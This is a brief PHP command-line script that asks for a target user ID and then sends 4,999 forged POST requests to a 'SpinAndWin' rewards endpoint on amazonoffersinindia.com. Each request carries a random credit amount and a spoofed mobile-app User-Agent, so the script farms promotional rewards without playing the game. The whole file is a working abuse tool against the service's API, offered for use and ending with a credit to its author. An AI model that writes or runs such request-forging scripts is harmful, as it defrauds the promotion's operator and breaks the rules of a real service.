<?php
function nabila($a, $id)
{
    $c[0] = "10";
    $c[1] = "20";
    $c[2] = "30";
    $c[3] = "40";
    $c[4] = "60";
    $c[5] = "80";
    $c[6] = "100";

    $acak = $c[rand(0,6)];
    $body = "user_id=".$id."&amount=".$acak."";
    $ch   = curl_init();

    curl_setopt($ch, CURLOPT_URL, "http://www.amazonoffersinindia.com:80/SpinAndWin/webservices/add_wheel_spin.php?");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");

    $headers   = array();
    $headers[] = "Content-Type: application/x-www-form-urlencoded";
    $headers[] = "Host: www.amazonoffersinindia.com";
    $headers[] = "User-Agent: okhttp/3.11.0";

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    return $result;
}

print "Thanks To : Muhammad Ikhsan Aprilyadi\n\n";
echo  "ID Target : ";

$id = trim(fgets(STDIN));

for ($a = 1; $a < 5000; $a++) {
    $res  = json_decode(nabila($a, $id));
    $data = $res->msg;
    echo " $data\n";
}
?>
